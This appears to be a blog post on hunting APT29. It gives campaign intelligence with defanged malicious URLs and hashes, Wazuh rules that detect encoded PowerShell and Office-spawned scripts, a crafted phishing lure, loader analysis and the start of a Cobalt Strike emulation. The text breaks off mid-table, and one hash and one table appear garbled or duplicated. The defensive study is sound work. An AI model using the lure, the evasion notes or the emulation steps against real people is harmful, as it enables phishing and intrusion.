---
title: "Full APT29 Hunting"
date: 2026-06-05 12:00:00 +0200
categories: [APT Hunting]
tags: [apt29, cozy-bear, threat-hunting, mitre-attack, kql, sysmon, wazuh, cobalt-strike, phishing, lsass, dfir, blue-team]
image:
  path: /assets/img/posts/apt29-hunting/img-001.png
  alt: "APT29 (Cozy Bear) threat-hunting lab report"
---

> **About this report.** This document combines open-source threat intelligence on APT29 with a controlled lab where each of the group's signature techniques is emulated end-to-end and then hunted down through detections and forensic artifacts. All offensive activity was performed in an isolated virtual environment for defensive research and education only.
{: .prompt-info }

---


## 1 · Threat Actor Profile

### 1.1 Overview

APT29 is a **highly sophisticated, Russian state-sponsored cyber-espionage group** believed to operate under the **Russian Foreign Intelligence Service (SVR)**.

- The **SVR** is Russia's civilian foreign intelligence agency, established in **December 1991**.
- It is tasked with intelligence and espionage activities **outside** the Russian Federation.
- **Active since 2008**, APT29 is notable for its advanced operational discipline, adaptability, and persistent targeting of well-defended organizations.

> 📎 Reference: <https://en.wikipedia.org/wiki/Foreign_Intelligence_Service_(Russia)>

### 1.2 Known Aliases

| Alias | Used by |
|-------|---------|
| **Cozy Bear** | CrowdStrike |
| **The Dukes** | F-Secure |
| **Nobelium** | Microsoft |
| **IRON HEMLOCK** | Secureworks |

<img src="/assets/img/posts/apt29-hunting/img-002.png" width="520" alt="APT29 known names"/>

> 📎 Reference: <https://www.sekoia.io/en/glossary/apt29-aka-nobelium-cozy-bear/>

### 1.3 Focus & Objectives

APT29's primary objective is **cyber espionage** against government agencies, political organizations, research institutions, and critical infrastructure.

Its motivation centers on:

- Gathering intelligence to support **Russian foreign and security policy** decision-making.
- **Disrupting national security** of target nations.
- **Influencing political processes.**

<img src="/assets/img/posts/apt29-hunting/img-003.png" width="520" alt="APT29 focus"/>

> 📎 References: <https://www.vectra.ai/modern-attack/threat-actors/apt29> · <https://hedgehogsecurity.co.uk/blog/who-is-apt29>

### 1.4 Most Targeted Countries

| Country / Bloc | Notes |
|----------------|-------|
| 🇺🇸 **United States** | Numerous government agencies (including the **SolarWinds** hack), private-sector companies, and NGOs |
| 🇬🇧 **United Kingdom** | Government institutions, research organizations, and defense sectors |
| 🇩🇪🇳🇴🇵🇱 **NATO Countries** | Germany, Norway, Poland |
| 🇪🇺 **EU States** | Especially those with roles in foreign policy, diplomacy, or international affairs |

<img src="/assets/img/posts/apt29-hunting/img-004.png" width="420" alt="Targeted countries"/>

> 📎 Reference: <https://cyble.com/threat-actor-profiles/apt-29/>

### 1.5 Most Targeted Sectors

`Media` · `Entertainment` · `Education` · `Energy` · `Healthcare, Pharmaceuticals & Biotechnology` · `Government`

> 📎 Reference: <https://cyble.com/threat-actor-profiles/apt-29/>

### 1.6 MITRE ATT&CK Techniques at a Glance

| ID | Technique | Tactic | Summary |
|----|-----------|--------|---------|
| **T1566.001** | Spearphishing Attachment | Initial Access | Targeted phishing emails with malicious attachments (Office docs, ISO/IMG, LNK, HTML smuggling) |
| **T1059.001** | PowerShell | Execution | Obfuscated/encoded PowerShell to run commands, fetch payloads, and move laterally |
| **T1053.005** | Scheduled Task | Persistence / Priv-Esc | Abuse of Task Scheduler for recurring execution of malicious code |
| **T1021.001** | Remote Desktop Protocol | Lateral Movement | Valid credentials + RDP for interactive lateral movement |
| **T1003.001** | LSASS Memory Dumping | Credential Access | Dumping LSASS to extract hashes, tickets, and tokens |
| **T1071.001** | Web Protocols | Command & Control | HTTP/HTTPS C2 blended into legitimate web traffic |

The following pages of MITRE ATT&CK confirm APT29's use of each technique:

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-005.png" width="400" alt="T1566.001"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-006.png" width="400" alt="MITRE row T1566.001"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-007.png" width="400" alt="T1059.001"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-009.png" width="400" alt="T1053.005"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-011.png" width="400" alt="T1021.001"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-013.png" width="400" alt="T1003.001"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-014.png" width="400" alt="T1071.001"/></td></tr>
</table>

> 📎 Technique references: [T1566.001](https://attack.mitre.org/techniques/T1566/001/) · [T1059.001](https://attack.mitre.org/techniques/T1059/001/) · [T1053.005](https://attack.mitre.org/techniques/T1053/005/) · [T1021.001](https://attack.mitre.org/techniques/T1021/001/) · [T1003.001](https://attack.mitre.org/techniques/T1003/001/) · [T1071.001](https://attack.mitre.org/techniques/T1071/001/)

---

## 2 · T1566.001 — Spearphishing Attachment

> **ID:** T1566.001 · **Sub-technique of:** T1566 · **Tactic:** Initial Access · **Platforms:** Linux, Windows, macOS

APT29 sends spearphishing emails to specific individuals or organizations. The emails carry malicious attachments — Microsoft Office documents, executables, PDFs, or archive files — that exploit vulnerabilities or execute a payload when opened. Social-engineering lures make the attachments appear legitimate, and victims are sometimes coached on how to bypass system protections.

<img src="/assets/img/posts/apt29-hunting/img-016.png" width="460" alt="T1566.001 MITRE detail"/>

### 2.1 File Types & Lure Themes

**File types observed in past campaigns:**

- Executables disguised with manipulated extensions or icons
- PDFs
- Password-protected archives (ZIP / RAR — used to abuse archive-handling exploits)
- HTML files containing JavaScript droppers (**HTML smuggling**)
- Disk-image formats (**ISO / IMG**) containing mounted virtual drives with malicious Windows shortcut (**LNK**) files and DLLs
- Remote Desktop Protocol (**.rdp**) configuration files

**Lure themes:**

- Diplomatic and embassy-related themes
- Political party and election-related lures
- COVID-19 content (early pandemic — now retired)

<img src="/assets/img/posts/apt29-hunting/img-017.png" width="420" alt="Lure themes"/>

> 📎 References: [APT29 evolving diplomatic phishing](https://cloud.google.com/blog/topics/threat-intelligence/apt29-evolving-diplomatic-phishing) · [Tracking APT29 phishing](https://cloud.google.com/blog/topics/threat-intelligence/tracking-apt29-phishing-campaigns) · [RNBO CVE-2023-38831 report](https://www.rnbo.gov.ua/files/2023_YEAR/CYBERCENTER/november/APT29%20attacks%20Embassies%20using%20CVE-2023-38831%20-%20report%20en.pdf)

### 2.2 Campaign Analysis (2023 Timeline)

```
Mar 2023 ──► Türkiye earthquake lure ──► European diplomatic ──► Apr 2023 "Old Wine" (Czechia)
   │                                                                      │
   └──────────────► May 2023 Kyiv (BMW + charity) ──► Jun 2023 Split ROOTSAW ──► Jul 2023 ICEBEAT
```

#### 🗓️ March 2023 — Earthquake-Themed Türkiye Campaign

In March 2023, **Mandiant** identified an APT29 phishing campaign targeting **Türkiye** that exploited the February 2023 earthquake disaster as a contextual lure. The attackers impersonated the **Turkish Deputy Minister of Foreign Affairs** and paired a malicious link with earthquake-related content to increase plausibility.

**First wave** — phishing email containing the URL `https://tinyurl[.]com/mrxcjsbs`.

<img src="/assets/img/posts/apt29-hunting/img-018.png" width="420" alt="TinyURL lure"/>

> **On TinyURL:** TinyURL.com itself is safe — until it performs its core function: redirecting a customer-assigned "tinyurl" to an external location. In malicious campaigns these links reliably obfuscate and redirect to malicious landing pages.
> 📎 <https://www.virustotal.com/gui/domain/tinyurl.com/community>
{: .prompt-warning }

The link redirected to a **ROOTSAW** dropper hosted on the actor-controlled compromised site `https://www[.]willyminiatures[.]com/e-yazi.htm/?v=bc78a8d162c6`.

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-019.png" width="380" alt="redirect evidence"/></td><td><img src="/assets/img/posts/apt29-hunting/img-020.png" width="380" alt="redirect evidence"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-021.png" width="380" alt="dropper"/></td><td><img src="/assets/img/posts/apt29-hunting/img-022.png" width="380" alt="ISO drop"/></td></tr>
</table>

| Field | Value |
|-------|-------|
| **Dropper name** | `e-yazi.htm` |
| **Dropped file (SHA-256)** | `4527057000a4b06f000983b5b61cc85c10f03691fa17d5c51a9fd0b24280662d` |
| **Drops** | ISO file `e-yazi.iso` |
| **Real file name** | `a8jet3l1v.exe` |
| **File hash (SHA-256)** | `948c62e8d953038b6a0030136cb82f55a8251db2c165ca07c01a7568f4644240` |
| **Magic** | HTML document, ASCII text, with very long lines |
| **File size** | 4.09 MB (4,288,788 bytes) |
| **First seen (VT)** | 2023-03-28 13:57 UTC |

**Second wave** — victims were redirected to `https://simplesalsamix[.]com/e-yazi.html`, which dropped the ROOTSAW dropper `e-yazi.html`.

<img src="/assets/img/posts/apt29-hunting/img-024.png" width="380" alt="second wave"/>

| Field | Value |
|-------|-------|
| **File name** | `e-yazi.html` (real: `download.html`) |
| **File hash (SHA-256)** | `cd4956e4c1a3f7c8c008c4658bb9eba7169aa874c55c12fc748b0ccfe0f4a59a` |
| **File size** | 1.02 MB (1,066,185 bytes) |
| **Also dropped via ZIP** | `e-yazi.zip` (real: `a557245e-c62a-433c-8df9-c2d6f0819d7d.tmp`) |
| **ZIP hash (SHA-256)** | `0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839` |

**ROOTSAW analysis** — tria.ge score 5/10. The dropper targeted:

- `e-yazi.pdf`
- `e-yazi.docx .exe` ← **double-extension** file (phishing trick)
- `Mso20Win32Client.DLL`
- `AppvIsvSubsystems64.dll`

<img src="/assets/img/posts/apt29-hunting/img-025.png" width="420" alt="ROOTSAW analysis"/>

**Command lines on `AppvIsvSubsystems64.dll`:**

```text
rundll32.exe  C:\Users\Admin\AppData\Local\Temp\AppvIsvSubsystems64.dll,#1
C:\Windows\system32\WerFault.exe -pss -s 188 -p 2516 -ip 2516
C:\Windows\system32\WerFault.exe -u -p 2516 -s 224
```

**Process tree:**
```
rundll32.exe ─► AppvIsvSubsystems64.dll
   └── (or) WerFault.exe ─► rundll32.exe ─► AppvIsvSubsystems64.dll
```
File location: `C:\Users\[User]\AppData\Local\Temp\AppvIsvSubsystems64.dll`

<img src="/assets/img/posts/apt29-hunting/img-026.png" width="420" alt="execution detail"/>

**Command lines on `e-yazi.pdf`** — once opened, Adobe Acrobat Reader spawns its CEF render processes:

```text
"C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe"
   "C:\Users\Admin\AppData\Local\Temp\e-yazi.pdf"
"...\AcroCEF\RdrCEF.exe" --backgroundcolor=16514043
"...\AcroCEF\RdrCEF.exe" --type=gpu-process ...
"...\AcroCEF\RdrCEF.exe" --type=renderer ...
C:\Windows\System32\CompPkgSrv.exe -Embedding
```
**Process tree:** `e-yazi.pdf ─► AcroRd32.exe ─► RdrCEF.exe ─► (child commands)`

**Command lines on `e-yazi.docx .exe`:**
```text
C:\Users\Admin\AppData\Local\Temp\e-yazi.docx .exe
sihost.exe
taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
```

<img src="/assets/img/posts/apt29-hunting/img-027.png" width="380" alt="docx.exe execution"/>

#### 🗓️ March 2023 — European Diplomatic-Focused Campaigns

Within the two weeks between the Türkiye campaign, APT29 targeted multiple diplomatic missions in Europe with **two new ROOTSAW variants** that moved the anti-analysis guardrails **server-side**.

The lure was a PDF inviting the recipient to a **drinks reception** following an event on the *"Future of International Economic Relations."* The PDF linked to ROOTSAW hosted at `https://parquesanrafael[.]cl/note.html`.

<img src="/assets/img/posts/apt29-hunting/img-028.png" width="380" alt="European diplomatic lure"/>

| Field | Value |
|-------|-------|
| **File name** | `Note.pdf` |
| **File hash (SHA-256)** | `46c8289301129c0833529495f4f3748b5adff78e18f1427654cb3b59735 2873e` *(highly reported)* |
| **Magic** | PDF document, version 1.5, 1 page |
| **File size** | 59.70 KB (61,135 bytes) |

This ROOTSAW variant sends the victim's **User-Agent** to the compromised server via an HTTP GET request:
`https://parquesanrafael[.]cl/note.php?ua=`

The server filters against an actor-defined **deny-list** and returns the payload decryption key only if the checks pass. On failure, ROOTSAW drops a **corrupt file** rather than exposing the embedded decoy (a change from earlier versions).

**Second wave** — a new ROOTSAW variant with **both User-Agent and IP filtering**, ultimately leading to the same **MUSKYBEAT** downloader.

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-029.png" width="380" alt="UA filtering"/></td><td><img src="/assets/img/posts/apt29-hunting/img-030.png" width="380" alt="UA filtering"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-031.png" width="380" alt="filtering"/></td><td><img src="/assets/img/posts/apt29-hunting/img-032.png" width="380" alt="filtering"/></td></tr>
</table>

| Field | Value |
|-------|-------|
| **File name** | `note.html` / `92a5be...4072f1_JC.html` |
| **File hash (SHA-256)** | `92a5be2893743435b79e94aa64a74233a2240fd790ca948e1cb046da5b4072f1` *(reported)* |
| **Magic** | HTML document, ASCII text, with very long lines |
| **File size** | 3.42 MB (3,587,003 bytes) |

**Command lines:**
```text
"C:\Program Files\Internet Explorer\iexplore.exe"
   C:\Users\Admin\AppData\Local\Temp\92a5be...4072f1_JC.html
"C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE" SCODEF:2288 CREDAT:275457 /prefetch:2
```

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-034.png" width="360" alt="exec"/></td><td><img src="/assets/img/posts/apt29-hunting/img-035.png" width="360" alt="exec"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-036.png" width="360" alt="exec"/></td><td><img src="/assets/img/posts/apt29-hunting/img-037.png" width="360" alt="exec"/></td></tr>
</table>

#### 🗓️ April 2023 — "Old Wine in a New Bottle"

This campaign opened a **new malware-delivery technique**. APT29 re-used a frequent diplomatic-event lure spoofing the **Czechia Embassy** — an invitation to a **wine-tasting event on April 13, 2023**.

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-038.png" width="350" alt="wine lure"/></td><td><img src="/assets/img/posts/apt29-hunting/img-039.png" width="350" alt="wine lure"/></td><td><img src="/assets/img/posts/apt29-hunting/img-040.png" width="350" alt="wine lure"/></td></tr>
</table>

The document linked to the phishing site `https://sylvio[.]com[.]br/form.php`, which delivered **either an ISO or a ZIP** archive. Notably, the actors **removed HTML smuggling** to reduce forensic artifacts left on the host.

<img src="/assets/img/posts/apt29-hunting/img-041.png" width="420" alt="wine event delivery"/>

| Field | Value |
|-------|-------|
| **File name** | `Wine event.pdf` |
| **File hash (SHA-256)** | `62ce8e1489a8b87539792c07179faf1db1b46caa39b55902a4d82dcec44d72ae` *(highly reported)* |
| **Magic** | PDF document, version 1.5, 1 page |
| **File size** | 61.53 KB (63,011 bytes) |
| **First seen (VT)** | 2023-04-06 16:43:48 UTC |

**Commands** — opening the PDF spawns Adobe Reader 9.0 / Acrobat Reader DC CEF processes:

```text
"C:\Program Files (x86)\Adobe\Reader 9.0\Reader\AcroRd32.exe"
   "C:\Users\Admin\AppData\Local\Temp\62ce8e...d72ae.pdf"
"...\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe" --backgroundcolor=16514043
"...\AcroCEF\RdrCEF.exe" --type=gpu-process ...
```

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-042.png" width="380" alt="commands"/></td><td><img src="/assets/img/posts/apt29-hunting/img-043.png" width="380" alt="commands"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-044.png" width="380" alt="commands"/></td><td><img src="/assets/img/posts/apt29-hunting/img-045.png" width="380" alt="commands"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-046.png" width="380" alt="commands"/></td><td><img src="/assets/img/posts/apt29-hunting/img-047.png" width="380" alt="commands"/></td></tr>
</table>

#### 🗓️ May 2023 — Ukraine Foreign-Embassy Campaigns (Kyiv)

In the lead-up to Ukraine's counteroffensive, APT29 ran **two phishing waves** against diplomatic representations in **Kyiv**, including those of Moscow's partners.

**First wave — the BMW lure.** A Polish diplomat had sent a legitimate email advertising a **used BMW for sale in Kyiv**. APT29 intercepted that flyer and repurposed it to deliver `bmw.iso`.

The ROOTSAW variant shared similarities with the March 2023 Türkiye variant; both used **User-Agent filtering** to decide what to serve:

| Campaign | User-Agent check | If criteria not met |
|----------|------------------|---------------------|
| **Türkiye (Mar 2023)** | Windows OS, `Windows NT` present, **no** `.NET` | Serves a **decoy PDF** |
| **Kyiv BMW (May 2023)** | Similar UA filtering | Serves weaponized `bmw.iso` **or** a harmless decoy BMW image |

| Field | Value |
|-------|-------|
| **File name** | `bmw.iso` |
| **File hash (MD5)** | `e306333093eaf198f4d416d25a40784a` *(highly reported)* |
| **Magic** | ISO 9660 CD-ROM filesystem data 'CDROM' |
| **File size** | 7.59 MB (7,960,576 bytes) |

**Targets inside the ISO:** `AppvIsvSubsystems64.dll`, `MSVCP140.dll`, `Mso20Win32Client.DLL`, `windoc.exe`, `bmw1.png.lnk`

**Command lines:**
```text
cmd /c C:\Users\Admin\AppData\Local\Temp\bmw1.png.lnk
"C:\Windows\System32\conhost.exe" cmd /c start .$Recycle.Bin\windoc.exe && ".$Recycle.Bin\bmw1.png"
cmd /c start .$Recycle.Bin\windoc.exe && .$Recycle.Bin\bmw1.png
.$Recycle.Bin\windoc.exe
```
**Process tree:** `bmw1.png.lnk ─► cmd.exe ─► conhost.exe ─► windoc.exe`

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-044.png" width="380" alt="bmw analysis"/></td><td><img src="/assets/img/posts/apt29-hunting/img-050.png" width="380" alt="bmw process tree"/></td></tr>
</table>

**Second wave — charity-concert lure.** In mid-May 2023, APT29 used an **invitation to a charity concert** as a lure, sending a misspelled attachment **`Invintation.zip`**. The payloads were hosted on actor-controlled infrastructure with **User-Agent filtering**, serving either a decoy-PDF ZIP or a second-stage-malware ZIP.

<img src="/assets/img/posts/apt29-hunting/img-051.png" width="420" alt="charity concert lure"/>

| Field | Value |
|-------|-------|
| **File name** | `Invintation.zip` |
| **File hash (MD5)** | `38719acc6254b7ff70dc8a7723bd8e92` |
| **Payload hash (MD5)** | `1aee5bf23edb7732fd0e6b2c61a959ce` |
| **Downloaded from** | `https://gavice[.]ng/event_program.php` |

**Dropped files:**
```text
2d794d1544f933aacbd8da2dad78b381
5569fb4e9140974a80b4b7587b026913   (BURNTBATTER)
1c0059d976795ceded7c1dd706e74bd1
595d8ea258ef8d8ec70b0e8a740e903c   (DONUT)
invitation_letter_and_programme_17.05.2023_en.pdf.exe
invitation_letter_and_programme_17.05.2023_ua.pdf.exe
```

<img src="/assets/img/posts/apt29-hunting/img-052.png" width="380" alt="dropped files"/> <img src="/assets/img/posts/apt29-hunting/img-053.png" width="380" alt="dropped files"/>

#### 🗓️ June 2023 — "Split ROOTSAW" Campaign

In late June 2023, APT29 targeted a **European government** with a new ROOTSAW variant. Phishing emails were sent from a **compromised North American government email address**, disguised as an invitation to a public-holiday celebration from **Norwegian embassy staff**.

Key tradecraft:

- ROOTSAW payload hosted on a **compromised WordPress server**.
- The server returned a **generic HTTP 404** to non-valid targets (instead of the standard WordPress 404), hiding activity from WordPress-level logs while leaving traces in the underlying web-server logs.
- The ROOTSAW delivered via **SVG** was a **primitive variant** (similar to 2021), lacking modern anti-analysis hardening — consistent with APT29 using simpler malware when trialing new delivery methods.

**PDF mechanism:**

| Field | Value |
|-------|-------|
| **File name** | `reception.pdf` |
| **File hash (SHA-256)** | `a8b56b51e085955b5641a9cb74c3b66ee5c37d62703f28b01cfbf7122a7edbfa` |
| **Magic** | PDF document, version 1.5, 1 page |
| **File size** | 25.23 KB (25,839 bytes) |
| **First seen (VT)** | 2023-06-23 10:40:26 UTC |

**SVG attachment:**

| Field | Value |
|-------|-------|
| **File name** | `__substg1.0_37010102` / `invitation.svg` |
| **File hash (SHA-256)** | `4875a9c4af3044db281c5dc02e5386c77f331e3b92e5ae79ff9961d8cd1f7c4f` |
| **Magic** | SVG Scalable Vector Graphics image |
| **File size** | 2.74 MB (2,737,155 bytes) |

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-055.png" width="380" alt="split rootsaw"/></td><td><img src="/assets/img/posts/apt29-hunting/img-056.png" width="380" alt="split rootsaw"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-057.png" width="380" alt="split rootsaw"/></td><td><img src="/assets/img/posts/apt29-hunting/img-058.png" width="380" alt="split rootsaw"/></td></tr>
</table>

**Attack chain (SVG → ISO → loaders → C2):**

<div align="center"><img src="/assets/img/posts/apt29-hunting/img-054.png" width="320" alt="Split ROOTSAW attack chain diagram"/></div>

#### 🗓️ July 2023 — "ICEBEAT" Campaign

In July 2023, APT29 deployed a new downloader called **ICEBEAT** and, for the **first time**, used a **PDF to deliver ROOTSAW**. The lure impersonated a **German embassy** invitation to an Ambassador's farewell reception.

Execution flow:

1. Opening the PDF writes an **HTML** file to disk.
2. Launching the HTML creates a **ZIP** file and connects to `https://sgrfh[.]org.pk/wp-content/idx.php?n=ks&q=` to profile the victim.
3. **ICEBEAT** uses the open-source **Zulip** messaging platform for C2 — consistent with APT29's pattern of abusing legitimate services (Dropbox, Firebase, OneDrive, Trello). ICEBEAT downloads subsequent payloads from Zulip.

| Field | Value |
|-------|-------|
| **File name** | `reception.pdf` |
| **File hash (SHA-256)** | `a8b56b51e085955b5641a9cb74c3b66ee5c37d62703f28b01cfbf7122a7edbfa` |
| **Magic** | PDF document, version 1.5, 1 page |
| **File size** | 25.23 KB (25,839 bytes) |
| **First seen (VT)** | 2023-06-23 10:40:26 UTC |

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-059.png" width="380" alt="ICEBEAT"/></td><td><img src="/assets/img/posts/apt29-hunting/img-060.png" width="380" alt="ICEBEAT"/></td></tr>
</table>

### 2.3 How the ROOTSAW Dropper Works

APT29 incorporated a new version of its **ROOTSAW** dropper with enhanced anti-analysis and evasion. Key features:

| Feature | Description |
|---------|-------------|
| **User-Agent filtering** | Checks the connecting device's UA for `Windows NT` while ensuring it does **not** contain `.NET`. |
| **Decoy file delivery** | Non-Windows / `.NET` requests receive a **benign decoy PDF** instead of the payload — defeating sandboxes. |
| **Consistent decoys** | In one wave, the decoy PDF served to filtered-out targets was **identical** to the one inside the malicious ZIP — reducing suspicion. |
| **Payload obfuscation** | Each payload is obfuscated with a **unique key**, while the deobfuscation routine stays the same — frustrating reverse engineering. |

### 2.4 Detection Engineering (Wazuh + Sysmon)

**Goal:** detect macros originating from any Office file. Install **Sysmon** on the agent, then build XML rules in Wazuh.

> 📎 Rule syntax reference: <https://documentation.wazuh.com/current/user-manual/ruleset/ruleset-xml-syntax/rules.html>

```xml
<group name="local-phishing-attachment">

  <!-- 1. ProcessCreate: Office app spawns a scripting/powershell process -->
  <rule id="200001" level="12">
    <if_group>sysmon,</if_group>
    <match>ParentImage: .*\\(winword|excel|powerpnt|outlook)\.exe</match>
    <match>Image: .*\\(powershell|pwsh|wscript|cscript|cmd|rundll32)\.exe</match>
    <description>Possible macro / attachment execution: Office spawned scripting/PowerShell</description>
  </rule>

  <!-- 2. CommandLine contains encoded/obfuscated PowerShell or suspicious flags -->
  <rule id="200002" level="12">
    <if_group>sysmon,</if_group>
    <match>CommandLine: .*(-EncodedCommand|-enc|iex|IEX )</match>
    <description>Potential encoded/obfuscated PowerShell (often used by malicious macros)</description>
  </rule>

  <!-- 3. FIM: new suspicious attachment file added (docm, xlsm, vbs, js) -->
  <rule id="200003" level="10">
    <if_group>syscheck,</if_group>
    <match>added</match>
    <match>\.(docm|xlsm|pptm|vbs|js|hta)$</match>
    <description>Suspicious attachment file added to monitored folder</description>
  </rule>

</group>
```

**Relevant telemetry events:**

| Event | Description |
|-------|-------------|
| **WinEvent 4688** | Process Creation (`winword.exe → powershell.exe`) |
| **WinEvent 4104** | PowerShell Script Block Logging |
| **Sysmon 1** | Process creation |
| **Sysmon 3** | Network connection (PowerShell → attacker) |
| **Sysmon 7** | ImageLoaded (VBA loads an unusual DLL) |
| **Sysmon 11** | File Create (macro dropped `.exe`) |
| **Sysmon 6** | Driver loaded (rare) |

**Simulation goal:** reproduce a Sysmon/Windows event matching a malicious-attachment open (`winword.exe`/`excel.exe` spawning `powershell`/`wscript`) and feed it into Wazuh with `wazuh-logtest`. Alternatively, perform a safe **FIM** test by creating a suspicious file (e.g. `invoice_malicious.docm`) in a monitored folder and confirm an `added` alert. Both methods are safe (no real macro execution).

**What we detect:** Office spawning a script/PowerShell child · suspicious PS flags (`-EncodedCommand`, `-enc`, `iex`) · new files with macro/script extensions.

**Observable indicators (deep investigation):**

```text
WINWORD.EXE  => powershell.exe
WINWORD.EXE  => mshta.exe
WINWORD.EXE  => regsvr32.exe
Outlook.exe  => Winword.exe

Macro writes to:  %APPDATA%\Microsoft\  ·  %LOCALAPPDATA%\Temp\  ·  %ProgramData%\ (rare)
Macro drops:      .exe | .js | .vbs | .dll
PowerShell:       powershell.exe -nop -w hidden   (hidden / non-interactive)
```

<img src="/assets/img/posts/apt29-hunting/img-061.png" width="360" alt="detection rule test"/>

### 2.5 Crafted Phishing Sample & Malware Analysis

A crafted phishing email modeled on this group's tradecraft:

> **Body**
> Hello,
> Please review the attached **Salary Adjustment Form for 2025**. Your digital signature is required before **12 Feb 2025**.
> To ensure document security, the file is delivered in a protected format. If prompted, click **Enable Content** to view the document.
> Regards, HR Compensation Team

**Mail header (abridged):**
```text
Return-Path: hr.department@secure-docs-support.com
Received: from mail.secure-docs-support.com ([185.83.121.44])
   by mail.victim.local with ESMTPS id 123456789
   for user@victim.local; Tue, 11 Feb 2025 10:22:33 +0200
Subject: Updated Salary Adjustment Form - Action Required
From: HR Department <hr.department@secure-docs-support.com>
To: user@victim.local
Message-ID: 20250211AHR-44321@mail.secure-docs-support.com
Content-Type: multipart/mixed; boundary="----=_Part_8848_9912413.1707643333002"
...
Content-Type: application/octet-stream; name="Salary_Adjustment.iso"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Salary_Adjustment.iso"
TVqQAAMAAAAEAAAA//8AALgAAAAA...   [Truncated malicious ISO base64 for safety]
```

**Analyst quick-checks:**

- [ ] Inspect the `Received:` chain
- [ ] Identify spoofing → validate domain, DKIM/SPF failures
- [ ] Extract the ISO base64 and decode manually
- [ ] Mount the ISO in an isolated VM
- [ ] Analyze the `.lnk` metadata

<img src="/assets/img/posts/apt29-hunting/img-063.png" width="420" alt="crafted phishing sample"/>

#### Full Malware Analysis — `covenant.exe`

> 📎 Reference walkthrough: <https://mssplab.github.io/threat-hunting/2023/06/02/malware-analysis-apt29.html>

| Field | Value |
|-------|-------|
| **File name** | `covenant.exe` |
| **File hash (SHA-256)** | `287543c235cf68695373d367144c51a0236879e614e8ea4634b82e5336785edc` |
| **File size** | 201 KB |
| **VT detection** | 40 / 71 vendors flagged malicious |
| **Sample** | <https://tria.ge/230613-s1dz9shc81> |

<img src="/assets/img/posts/apt29-hunting/img-064.png" width="460" alt="VT detection"/>

**PEStudio analysis:**

```text
File Header: 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 B8 00 00 00 ...
Type:        executable, 64-bit, GUI
Entry Point: 48 83 EC 28 E8 D7 03 00 00 48 83 C4 28 E9 7A FE FF FF CC CC ...
```

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-065.png" width="400" alt="PEStudio header"/></td><td><img src="/assets/img/posts/apt29-hunting/img-066.png" width="400" alt="PEStudio"/></td></tr>
</table>

**Imports** *(this is a packed file — imports are not very telling):*
`CreateTimerQueueTimer` · `TerminateProcess` · `GetCurrentProcess` · `WaitForSingleObject` · `CreateThread` · `GetEnvironmentStringsW` · `FindNextFileW`

**Strings** *(mostly junk / encrypted blob):* `GetCommandLine` · `xuzviqpds{cxdfklk` · `MS Shell Dlg` · `UpdateWindow` · `LoadIcon`

<img src="/assets/img/posts/apt29-hunting/img-067.png" width="400" alt="imports"/>

##### Why it looks "clean" by strings and imports

This is a **low-level loader/injector** — typical of APT29 / Cozy Bear. It is **not** a Word macro, a PowerShell script, a Cobalt Strike beacon, or a Covenant grunt.

- **Minimal imports / API hashing.** Instead of importing `VirtualAlloc`, `CreateRemoteThread`, `WriteProcessMemory`, `VirtualProtect`, `CreateProcess`, etc., the loader hashes each API name at runtime, resolves it dynamically, and calls it by pointer. Effects:
  1. Static scanners see no suspicious APIs.
  2. Analysts see a harmless-looking import table.
  *(This technique is heavily documented in NSA's public reports on APT29.)*
- **Random strings = encrypted payload.** Strings like `D$E3 LSHH3 htJ |SHH T50H 5Eu` are fragments of an encrypted blob (XOR loops, ADD/SUB transforms, rolling ciphers). The decrypted payload exists **only in memory** after the loader runs — which is why you never see URLs, domains, PowerShell commands, config, or keys statically.

<img src="/assets/img/posts/apt29-hunting/img-068.png" width="400" alt="loader behavior"/> <img src="/assets/img/posts/apt29-hunting/img-069.png" width="400" alt="loader behavior"/>

##### Core behavior of the loader

1. **Calls `CreateTimerQueueTimer`** — not normal scheduling; used for delayed execution, anti-debugging, and anti-sandbox (sandboxes kill samples that "sleep too long").
2. **Decrypts the embedded payload** from `.rdata`, `.data`, custom sections, or PE resources.
3. **Resolves APIs dynamically** at runtime: `LoadLibraryA`, `GetProcAddress`, `VirtualAlloc`, `VirtualProtect`, `CreateThread`.
4. **Performs injection** — self-injection (stealthy) or into a newly spawned hollowed process.
5. **Executes the Stage-1 payload** — backdoor, C2 communication, persistence, lateral movement.

### 2.6 Emulation: Delivery via Cobalt Strike

Create a payload in Cobalt Strike connected to a pre-existing listener.

<img src="/assets/img/posts/apt29-hunting/img-070.png" width="460" alt="Cobalt Strike listener"/>

<img src="/assets/img/posts/apt29-hunting/img-071.png" width="460" alt="Cobalt Strike payload"/>

It will be detected by mail security, which can be bypassed by standing up your own mail server (e.g. Mailhog) — out of scope here.

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-073.png" width="380" alt="crafted phishing email"/></td><td><img src="/assets/img/posts/apt29-hunting/img-075.png" width="250" alt="delivery"/></td></tr>
